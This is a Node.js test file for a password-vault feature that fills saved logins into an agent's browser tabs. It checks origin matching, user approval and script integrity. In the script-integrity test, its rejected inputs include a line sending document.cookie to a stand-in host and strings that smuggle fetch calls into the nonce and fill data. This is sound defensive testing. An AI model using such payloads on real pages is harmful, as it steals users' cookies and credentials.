'use strict';
// Vault fill: the preview.act `vault` requests Hermes sends to fill a saved login into an agent tab.
// The gate (bot, tab, exact origin, prompt, re-check) runs against fake tabs; the real page scripts are
// exercised against a real page in vault-fill-electron.cjs. Pure Node: no sockets, no Electron.
const { test } = require('node:test');
const assert = require('node:assert/strict');
const { createVaultFill, isVaultRequest } = require('../src/vault-fill.cjs');
const { INSPECT, FILL } = require('../src/vault-scripts.cjs');

// A password with every character that could break a naive substitution or a JSON round trip.
const PW = 'CANARY-7c1e9a-$&-$\'-"q"-\\-é- ';
const ORIGIN = 'https://example.com';
const NONCE = '0123456789abcdef';

// Python's json.dumps default: ensure_ascii, ", " and ": " separators — what Hermes actually sends.
function pyDumps(v) {
  if (typeof v === 'string') return JSON.stringify(v).replace(/[\u007f-￿]/g, (c) => `\\u${c.charCodeAt(0).toString(16).padStart(4, '0')}`);
  if (Array.isArray(v)) return `[${v.map(pyDumps).join(', ')}]`;
  if (v && typeof v === 'object') return `{${Object.entries(v).map(([k, x]) => `${pyDumps(k)}: ${pyDumps(x)}`).join(', ')}}`;
  return JSON.stringify(v);
}
// Function replacers: a `$&` in the password must stay literal, as Python's str.replace keeps it.
const inspectJs = (nonce = NONCE) => INSPECT.replace('__NONCE__', () => pyDumps(nonce));
const fillJs = ({ origin = ORIGIN, fills = [{ index: 1, token: 'current-password', value: PW }], nonce = NONCE } = {}) =>
  FILL.replace('__EXPECTED_ORIGIN__', () => pyDumps(origin)).replace('__FILLS__', () => pyDumps(fills)).replace('__NONCE__', () => pyDumps(nonce));

function makeTab({ id = 't1', botId = 'bot1', url = `${ORIGIN}/login`, controller = 'agent' } = {}) {
  const frame = { url, detached: false, ran: [], isDestroyed: () => false };
  const wc = { url, getURL: () => wc.url, mainFrame: frame, destroyed: false, isDestroyed: () => wc.destroyed, isCrashed: () => false };
  const tab = { id, botId, controller, owner: 'bot', epoch: 1, generation: 1, navigationUrl: '', recoveryUrl: '', error: '', extensionPage: false, localPdf: false,
    view: { webContents: wc }, frame, wc,
    page: { inspect: () => JSON.stringify([{ autocomplete: 'current-password', formIndex: 0, index: 1, maxLength: null, label: 'Password', name: 'pw login', type: 'password' },
      { autocomplete: 'username', formIndex: 0, index: 0, maxLength: null, label: 'Email address', name: 'user', type: 'text' }]), fill: () => '{"filled":1}' },
    go(next) { wc.url = next; frame.url = next; tab.generation++; } };
  frame.executeJavaScript = async (code) => {
    frame.ran.push(code);
    return code.includes('const expectedOrigin') ? tab.page.fill(code) : tab.page.inspect(code);
  };
  return tab;
}

function rig({ decision = true, ...limits } = {}) {
  const tabs = new Map(), asks = [], logs = [], answers = [], clock = { t: 1_000_000 };
  const bots = { s1: 'bot1', s2: 'bot2' };
  const rigState = { decision };
  const vault = createVaultFill({
    botFor: (storedId) => bots[storedId] || '', nameFor: (id) => `Bot ${id}`, listTabs: () => tabs.values(),
    ask: async (info, signal) => { asks.push(info); return typeof rigState.decision === 'function' ? rigState.decision(info, signal) : rigState.decision; },
    log: (event, fields) => logs.push([event, fields]), now: () => clock.t, ...limits,
  });
  const requests = [];
  const call = async (storedId, v, { signal } = {}) => {
    const request = { storedId, sessionId: `rt-${storedId}`, params: { session_id: `rt-${storedId}`, action: 'vault', vault: v }, signal };
    requests.push(request);
    const out = await vault.handle(request);
    answers.push(out);
    return { ...JSON.parse(out.value), raw: out.value };
  };
  const add = (opts) => { const tab = makeTab(opts); tabs.set(tab.id, tab); return tab; };
  const open = async (storedId = 's1') => { const r = await call(storedId, { operation: 'open' }); assert.equal(r.success, true, `open: ${r.raw}`); return r.target; };
  const evaluate = (target, expression, storedId = 's1') => call(storedId, { operation: 'evaluate', target, expression });
  const everything = () => JSON.stringify([answers, logs, asks]);
  return { vault, tabs, asks, logs, answers, requests, clock, state: rigState, call, add, open, evaluate, everything };
}
const noPassword = (r) => assert.equal(r.everything().includes('CANARY'), false, 'the canary appears nowhere an answer, log or prompt could carry it');
const ranFill = (tab) => tab.frame.ran.filter((c) => c.includes('const expectedOrigin'));

test('fills the password on the exact origin after Allow once, and says nothing else', async () => {
  const r = rig(), tab = r.add();
  const target = await r.open();
  const href = await r.evaluate(target, 'window.location.href');
  assert.deepEqual([href.success, href.result], [true, `${ORIGIN}/`], 'only the origin leaves, taken from the main process');
  assert.equal(tab.frame.ran.length, 0, 'the page was not asked for its own address');
  const inspected = await r.evaluate(target, inspectJs());
  assert.equal(inspected.success, true);
  const done = await r.evaluate(target, fillJs());
  assert.deepEqual([done.success, done.result], [true, '{"filled":1}']);
  assert.equal(r.asks.length, 1);
  assert.deepEqual(r.asks[0], { botId: 'bot1', botName: 'Bot bot1', origin: ORIGIN });
  assert.equal(ranFill(tab).length, 1);
  assert.ok(ranFill(tab)[0].includes('const nonce = "0123456789abcdef"'));
  assert.equal(JSON.parse(ranFill(tab)[0].match(/const fills = (.*);\n/)[1])[0].value, PW, 'the page received the exact password');
  noPassword(r);
  const closed = await r.call('s1', { operation: 'close', target });
  assert.equal(closed.success, true);
  assert.equal((await r.evaluate(target, 'window.location.href')).success, false, 'a closed target is gone');
});

test('the password is dropped from the request once it is typed', async () => {
  const r = rig(); r.add();
  const target = await r.open();
  await r.evaluate(target, inspectJs());
  const request = () => r.requests.at(-1);
  await r.evaluate(target, fillJs());
  assert.equal(request().params.vault.expression, '');
});

test('refuses unless the tab origin equals the origin the entry is bound to', async () => {
  const cases = [
    ['https://example.com', 'http://example.com/login', 'http vs https'],
    ['http://example.com', 'https://example.com/login', 'https vs http'],
    ['https://example.com', 'https://sub.example.com/login', 'a subdomain'],
    ['https://sub.example.com', 'https://example.com/login', 'the parent of a subdomain entry'],
    ['https://example.com', 'https://example.com.evil.test/login', 'a suffix lookalike'],
    ['https://example.com', 'https://evilexample.com/login', 'a prefix lookalike'],
    ['https://example.com', 'https://example.com:8443/login', 'another port'],
    ['https://example.com', 'https://example.com@evil.test/login', 'userinfo that looks like the host'],
    ['https://example.com', 'https://exаmple.com/login', 'a Cyrillic lookalike'],
    ['https://example.com', 'https://example.com./login', 'a trailing dot'],
  ];
  for (const [bound, url, why] of cases) {
    const r = rig(), tab = r.add({ url });
    const target = await r.open();
    await r.evaluate(target, inspectJs());
    const out = await r.evaluate(target, fillJs({ origin: bound }));
    assert.deepEqual([out.success, out.error_type], [false, 'origin_mismatch'], why);
    assert.equal(r.asks.length, 0, `${why}: the user is not asked about a fill that cannot happen`);
    assert.equal(ranFill(tab).length, 0, `${why}: nothing reached the page`);
    noPassword(r);
  }
});

test('refuses an entry origin that is not a plain http(s) origin', async () => {
  for (const origin of ['https://example.com/', 'HTTPS://EXAMPLE.COM', 'null', '', 'file:///tmp/x', 'about:blank', 'https://example.com/login', 7]) {
    const r = rig(), tab = r.add();
    const target = await r.open();
    await r.evaluate(target, inspectJs());
    const out = await r.evaluate(target, fillJs({ origin }));
    assert.equal(out.success, false, String(origin));
    assert.equal(ranFill(tab).length + r.asks.length, 0, String(origin));
  }
});

test('refuses a main frame whose address is not the tab address (nothing is filled across frames)', async () => {
  const r = rig(), tab = r.add();
  const target = await r.open();
  await r.evaluate(target, inspectJs());
  tab.frame.url = 'https://evil.test/embedded';
  const out = await r.evaluate(target, fillJs());
  assert.deepEqual([out.success, out.error_type], [false, 'page_changed']);
  assert.equal(ranFill(tab).length, 0);
});

test("refuses a tab that is not an agent tab owned by this conversation's bot", async () => {
  const mine = [['another bot', { botId: 'bot2' }], ['no bot', { botId: 'shared' }], ['a human-controlled tab', { controller: 'human' }]];
  for (const [why, opts] of mine) {
    const r = rig(), tab = r.add(opts);
    const out = await r.call('s1', { operation: 'open' });
    assert.equal(out.success, false, why);
    assert.equal(tab.frame.ran.length + r.asks.length, 0, why);
  }
  for (const [why, opts] of [['an extension page', { id: 'x' }], ['a local PDF', { id: 'p' }], ['a dead page', { id: 'd' }]]) {
    const r = rig(), tab = r.add(opts);
    if (why.includes('extension')) tab.extensionPage = true;
    if (why.includes('PDF')) tab.localPdf = true;
    if (why.includes('dead')) tab.wc.destroyed = true;
    assert.equal((await r.call('s1', { operation: 'open' })).success, false, why);
  }
  const r = rig(); r.add();
  assert.equal((await r.call('nobody', { operation: 'open' })).error_type, 'no_bot', 'a conversation no bot owns');
  const other = await r.call('s2', { operation: 'open' });
  assert.equal(other.error_type, 'no_tab', "bot2 cannot use bot1's tab");
});

test('a target is usable only by the conversation that opened it', async () => {
  const r = rig(); r.add(); r.add({ id: 't2', botId: 'bot2' });
  const target = await r.open('s1');
  const out = await r.evaluate(target, 'window.location.href', 's2');
  assert.deepEqual([out.success, out.error_type], [false, 'unknown_target']);
});

test('Deny refuses, and a retry inside the cooldown does not ask again', async () => {
  const r = rig({ decision: false }), tab = r.add();
  const target = await r.open();
  await r.evaluate(target, inspectJs());
  const denied = await r.evaluate(target, fillJs());
  assert.deepEqual([denied.success, denied.error_type], [false, 'denied']);
  const target2 = await r.open();
  await r.evaluate(target2, inspectJs());
  const again = await r.evaluate(target2, fillJs());
  assert.equal(again.error_type, 'denied_recently');
  assert.equal(r.asks.length, 1);
  assert.equal(ranFill(tab).length, 0);
  r.clock.t += 61_000; r.state.decision = true;
  const target3 = await r.open();
  await r.evaluate(target3, inspectJs());
  assert.equal((await r.evaluate(target3, fillJs())).success, true, 'after the cooldown it asks again');
  noPassword(r);
});

test('no answer, a withdrawn request or a timeout all refuse', async () => {
  let r = rig({ decision: null }); let tab = r.add();
  let target = await r.open(); await r.evaluate(target, inspectJs());
  assert.equal((await r.evaluate(target, fillJs())).error_type, 'no_answer');
  assert.equal(ranFill(tab).length, 0);

  r = rig({ askMs: 20, decision: (_i, signal) => new Promise((resolve) => signal.addEventListener('abort', () => resolve(true))) }); tab = r.add();
  target = await r.open(); await r.evaluate(target, inspectJs());
  const slow = await r.evaluate(target, fillJs());
  assert.deepEqual([slow.success, slow.error_type], [false, 'no_answer'], 'an Allow that arrives after the deadline does not count');
  assert.equal(ranFill(tab).length, 0);

  const withdraw = new AbortController();
  r = rig({ decision: (_i, signal) => new Promise((resolve) => signal.addEventListener('abort', () => resolve(true))) }); tab = r.add();
  target = await r.open(); await r.evaluate(target, inspectJs());
  const request = r.vault.handle({ storedId: 's1', sessionId: 'rt-s1', signal: withdraw.signal,
    params: { session_id: 'rt-s1', action: 'vault', vault: { operation: 'evaluate', target, expression: fillJs() } } });
  await new Promise((resolve) => setImmediate(resolve));
  withdraw.abort();
  const withdrawn = JSON.parse((await request).value);
  assert.deepEqual([withdrawn.success, withdrawn.error_type], [false, 'no_answer'], 'a withdrawn request is not an Allow');
  assert.equal(ranFill(tab).length, 0);
});

test('a second fill while the prompt is open is refused, not stacked', async () => {
  let release;
  const r = rig({ decision: () => new Promise((resolve) => { release = resolve; }) });
  r.add(); r.add({ id: 't2', botId: 'bot2' });
  const a = await r.open('s1'), b = await r.open('s2');
  await r.evaluate(a, inspectJs()); await r.evaluate(b, inspectJs('fedcba9876543210'), 's2');
  const first = r.evaluate(a, fillJs());
  await new Promise((resolve) => setImmediate(resolve));
  const second = await r.evaluate(b, fillJs({ nonce: 'fedcba9876543210' }), 's2');
  assert.deepEqual([second.success, second.error_type], [false, 'busy']);
  release(true);
  assert.equal((await first).success, true);
});

test('anything that changes between the prompt and the fill refuses and types nothing', async () => {
  const changes = [
    ['a navigation to another site', (tab) => tab.go('https://evil.test/')],
    ['a navigation inside the same site', (tab) => tab.go(`${ORIGIN}/other`)],
    ['an in-page navigation', (tab) => { tab.generation++; }],
    ['a navigation that has started', (tab) => { tab.navigationUrl = 'https://evil.test/'; }],
    ['the page failing to load', (tab) => { tab.error = 'This page stopped.'; }],
    ['the human taking the tab', (tab) => { tab.controller = 'human'; }],
    ['control changing hands', (tab) => { tab.epoch++; }],
    ['the tab moving to another bot', (tab) => { tab.botId = 'bot2'; }],
    ['the page crashing', (tab) => { tab.wc.isCrashed = () => true; }],
    ['the tab closing', (tab, r) => { r.tabs.delete(tab.id); }],
    ['the page being destroyed', (tab) => { tab.wc.destroyed = true; }],
  ];
  for (const [why, change] of changes) {
    const r = rig(), tab = r.add();
    r.state.decision = () => { change(tab, r); return true; };
    const target = await r.open(); await r.evaluate(target, inspectJs());
    const out = await r.evaluate(target, fillJs());
    assert.equal(out.success, false, why);
    assert.equal(ranFill(tab).length, 0, `${why}: the password never reached the page`);
    noPassword(r);
  }
});

test('refuses while the tab is navigating or after it moved since the target was opened', async () => {
  let r = rig(), tab = r.add();
  tab.navigationUrl = 'https://example.com/next';
  assert.equal((await r.call('s1', { operation: 'open' })).error_type, 'navigating');
  tab.navigationUrl = '';
  const target = await r.open();
  tab.navigationUrl = 'https://example.com/next';
  assert.equal((await r.evaluate(target, 'window.location.href')).error_type, 'navigating');
  tab.navigationUrl = '';
  tab.go(`${ORIGIN}/elsewhere`);
  assert.equal((await r.evaluate(target, 'window.location.href')).error_type, 'page_changed');
  assert.equal((await r.evaluate(target, inspectJs())).error_type, 'page_changed');
});

test('malformed requests are refused before any page script runs', async () => {
  const r = rig(), tab = r.add();
  const target = await r.open();
  const bad = [
    {}, { operation: 7 }, { operation: 'unlock' }, { operation: 'evaluate' }, { operation: 'evaluate', target: 7, expression: 'x' },
    { operation: 'evaluate', target, expression: 7 }, { operation: 'evaluate', target, expression: '' },
    { operation: 'evaluate', target, expression: 'x'.repeat(200_000) }, { operation: 'close' }, { operation: 'close', target: {} },
    { operation: 'evaluate', target: 'not-a-target', expression: 'window.location.href' },
  ];
  for (const v of bad) assert.equal((await r.call('s1', v)).success, false, JSON.stringify(v).slice(0, 60));
  for (const params of [null, [], 'x', { action: 'vault' }, { action: 'vault', vault: [] }, { action: 'vault', vault: 'open' }]) {
    const out = JSON.parse((await r.vault.handle({ storedId: 's1', sessionId: 'rt-s1', params })).value);
    assert.equal(out.success, false, JSON.stringify(params));
  }
  assert.equal(tab.frame.ran.length, 0);
});

test('only the exact scripts Hermes builds are run in the page', async () => {
  const injected = (extra) => fillJs().replace(/\}\)\(\)$/, () => `${extra}})()`);
  const foreign = [
    'document.cookie', "fetch('https://evil.test/' + document.cookie)", 'window.location.href;1', ' window.location.href',
    inspectJs() + ';fetch(1)', `${inspectJs()}\n`, inspectJs().replace('getComputedStyle', 'fetch'), inspectJs('abc'), inspectJs('0123456789abcdef"; fetch(1); "'),
    injected(';fetch(1);'), fillJs().replace('window.location.origin !== expectedOrigin', 'false'), fillJs().replace('el.type !== "password"', 'false'),
    FILL.replace('__EXPECTED_ORIGIN__', '"https://example.com"').replace('__FILLS__', '[{"index":1,"token":"current-password","value":"x"}];fetch(1);//').replace('__NONCE__', '"0123456789abcdef"'),
    FILL.replace('__EXPECTED_ORIGIN__', '"https://example.com"').replace('__FILLS__', '[{"index":1,"token":"current-password","value":"x","run":"fetch(1)"}]').replace('__NONCE__', '"0123456789abcdef"'),
  ];
  const r = rig(), tab = r.add();
  const target = await r.open();
  await r.evaluate(target, inspectJs());
  tab.frame.ran.length = 0;
  for (const expression of foreign) {
    const out = await r.evaluate(target, expression);
    assert.equal(out.success, false, expression.slice(0, 80));
  }
  assert.equal(tab.frame.ran.length, 0, 'none of it reached the page');
  assert.equal(r.asks.length, 0);
});

test('one-time codes, identifiers, cards and unlock are not supported yet', async () => {
  const unsupported = [
    [{ index: 1, token: 'one-time-code', value: '123456' }],
    [{ index: 1, token: 'current-password', value: PW }, { index: 0, token: 'username', value: 'me@example.com' }],
    [{ index: 1, token: 'cc-number', value: '4111111111111111' }],
    [{ index: 1, token: 'current-password', value: PW }, { index: 2, token: 'current-password', value: PW }],
    [],
  ];
  for (const fills of unsupported) {
    const r = rig(), tab = r.add();
    const target = await r.open(); await r.evaluate(target, inspectJs());
    const out = await r.evaluate(target, fillJs({ fills }));
    assert.equal(out.success, false, JSON.stringify(fills).slice(0, 50));
    assert.ok(fills.length === 0 || /not supported yet/i.test(out.error), out.error);
    assert.equal(r.asks.length + ranFill(tab).length, 0);
  }
  const r = rig(); r.add();
  assert.match((await r.call('s1', { operation: 'unlock' })).error, /not supported yet/i);
});

test('a fill needs the inspection it stamps, and runs once per target', async () => {
  const r = rig(), tab = r.add();
  const target = await r.open();
  assert.equal((await r.evaluate(target, fillJs())).error_type, 'no_inspection');
  await r.evaluate(target, inspectJs());
  assert.equal((await r.evaluate(target, fillJs({ nonce: 'ffffffffffffffff' }))).error_type, 'no_inspection', 'another inspection\'s stamps');
  assert.equal((await r.evaluate(target, fillJs())).success, true);
  assert.equal((await r.evaluate(target, fillJs())).error_type, 'already_filled');
  assert.equal(ranFill(tab).length, 1);
  assert.equal(r.asks.length, 1, 'one Allow covers one fill');
});

test('what the page answers is rebuilt, not passed on', async () => {
  const r = rig(), tab = r.add();
  const target = await r.open();
  tab.page.inspect = () => JSON.stringify([
    { autocomplete: 'current-password', formIndex: 0, index: 1, maxLength: null, label: 'Password '.repeat(100), name: 'pw', type: 'password', secretish: 'CANARY-from-page' },
    { autocomplete: 'username', formIndex: 0, index: 0, maxLength: null, label: 'Email address', name: 'user', type: 'text' },
    { index: -3, type: 'password' }, 'junk', { index: 4, type: 'password', formIndex: 'x', maxLength: 'y', label: 5 },
  ]);
  const inspected = await r.evaluate(target, inspectJs());
  const controls = JSON.parse(inspected.result);
  assert.deepEqual(controls.map((c) => c.index), [1, 4], 'only password controls, with a sane index');
  assert.deepEqual(Object.keys(controls[0]).sort(), ['autocomplete', 'formIndex', 'index', 'label', 'maxLength', 'name', 'type']);
  assert.ok(controls[0].label.length <= 200);
  assert.equal(controls[1].formIndex, null);
  assert.equal(inspected.raw.includes('from-page'), false);

  tab.page.inspect = () => 'not json';
  const target2 = await r.open();
  assert.equal((await r.evaluate(target2, inspectJs())).error_type, 'page_failed');

  tab.page.inspect = () => '[]';
  tab.page.fill = () => JSON.stringify({ filled: 1, echo: PW });
  const target3 = await r.open(); await r.evaluate(target3, inspectJs());
  assert.equal((await r.evaluate(target3, fillJs())).result, '{"filled":1}', 'a count, rebuilt');
  tab.page.fill = () => PW;
  const target4 = await r.open(); await r.evaluate(target4, inspectJs());
  const garbled = await r.evaluate(target4, fillJs({ origin: ORIGIN }));
  assert.equal(garbled.error_type, 'page_failed');
  tab.page.fill = () => '{"refused":"origin_changed","found":"https://evil.test"}';
  const target5 = await r.open(); await r.evaluate(target5, inspectJs());
  const moved = await r.evaluate(target5, fillJs());
  assert.deepEqual([moved.success, JSON.parse(moved.result).refused], [true, 'origin_changed'], "Hermes's own origin_changed answer");
  assert.equal(JSON.parse(moved.result).found, ORIGIN, 'named from the app, not the page');
  noPassword(r);
});

test('a page error that quotes the script never reaches the answer or the log', async () => {
  const r = rig(), tab = r.add();
  const target = await r.open(); await r.evaluate(target, inspectJs());
  tab.frame.executeJavaScript = async (code) => { throw new Error(`Uncaught: ${code.slice(0, 4000)}`); };
  const out = await r.evaluate(target, fillJs());
  assert.deepEqual([out.success, out.error_type], [false, 'page_failed']);
  noPassword(r);
});

test('a target expires, and open targets are bounded', async () => {
  const r = rig(); r.add();
  const target = await r.open();
  r.clock.t += 5 * 60_000 + 1;
  assert.equal((await r.evaluate(target, 'window.location.href')).error_type, 'unknown_target');
  const targets = [];
  for (let i = 0; i < 20; i++) targets.push(await r.open());
  assert.equal((await r.evaluate(targets[0], 'window.location.href')).success, false, 'the oldest is dropped');
  assert.equal((await r.evaluate(targets.at(-1), 'window.location.href')).success, true);
});

test('logs name the step and the reason, nothing about the site, the account or the password', async () => {
  const r = rig(), tab = r.add();
  const target = await r.open(); await r.evaluate(target, inspectJs());
  await r.evaluate(target, fillJs());
  tab.go('https://evil.test/');
  await r.evaluate(target, 'window.location.href');
  assert.ok(r.logs.length >= 3);
  for (const [event, fields] of r.logs) {
    assert.match(event, /^vault\./);
    assert.deepEqual(Object.keys(fields).filter((k) => !['op', 'ok', 'reason'].includes(k)), []);
  }
  assert.equal(JSON.stringify(r.logs).includes('example.com'), false);
});

test('isVaultRequest names the vault family and nothing else', () => {
  assert.equal(isVaultRequest('preview.act', { action: 'vault', vault: {} }), true);
  assert.equal(isVaultRequest('preview.act', { action: 'click' }), false);
  for (const m of ['vault.code', 'vault.unlock_prompt', 'vault.save_login']) assert.equal(isVaultRequest(m, {}), true, m);
  for (const m of ['approval', 'clarify', 'preview.read', 'sudo']) assert.equal(isVaultRequest(m, { action: 'vault' }), false, m);
});
